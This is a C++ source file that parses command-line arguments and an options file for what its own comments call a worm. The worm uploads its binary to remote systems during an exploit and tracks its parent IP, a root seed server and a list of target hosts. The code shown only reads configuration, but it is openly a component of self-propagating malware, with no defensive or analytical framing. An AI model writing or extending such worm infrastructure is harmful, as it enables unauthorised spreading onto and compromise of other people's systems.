#include "ArgumentParser.hpp"

bool ArgumentParser::parse(const int argc, const char * const argv[]) {
	if(argc < 4) {
		logger->log("ERROR: Insufficient arguments");
		return false;
	}
	
	// We can't rely on argv[0] to be the actual program path and filename since it could be only relative or even
	//	reference a binary in the system path.  It could also be faked or an empty string so just ignore it and
	//	require that the first program option argument be the full pathname of the binary worm to upload to the
	//	remote system during the exploit.  This makes it possible for the worm on one machine to use a different
	//	version of the worm on a target machine for future code.
	
	Configuration::wormBinaryFullPathname = boost::filesystem::absolute(boost::filesystem::path(argv[1])).string();
	
	Configuration::wormOptionsFileFullPathname = boost::filesystem::absolute(boost::filesystem::path(argv[2])).string();
        
	Configuration::updateBinaryFullPathname = boost::filesystem::absolute(boost::filesystem::path(argv[3])).string();
	
	if(argc > 4) {  // existance of 5th argument means is seed flag set
		Configuration::isRootSeed = true;
	} else {
		Configuration::isRootSeed = false;
	}
	
	// Parse the data in the file wormOptionsFileFullPathname
	std::locale utf8locale(std::locale(), new boost::unofficial::library::utf8_codecvt_facet);
	std::ifstream optionfilestream;
	optionfilestream.imbue(utf8locale);  // recommended to do before open call as some platforms get inconsistent otherwise
			
	// Setup the log file
	optionfilestream.open(Configuration::wormOptionsFileFullPathname.c_str(), std::ios::in);

	// Skip the UTF-8 BOM
	optionfilestream.seekg(3);  // 3 bytes
	
	
	/* First line */
	logger->log("Parent (source) of worm IP address:  " + Utilities::getline(optionfilestream));
	
	/* Next line */
	logger->log("Parent (source) timestamp:  " + Utilities::getline(optionfilestream));
	
	/* Next line */
	Configuration::rootSeed = Utilities::getline(optionfilestream);
	logger->log("Root server for worm has IP/ID of:  " + Configuration::rootSeed);
	
	/* Rest of lines */
	logger->log("Target List:");
	std::string line;
	while(!optionfilestream.eof()) {
		line = Utilities::getline(optionfilestream);
		
		if(line.empty()) {
			// Really shouldn't happen expect possibly on the last line
			continue;
		}
		
		Configuration::targets.push_back(line);
		
		logger->log("\t" + line);
	}
	
	optionfilestream.close();
	
	return true;
}
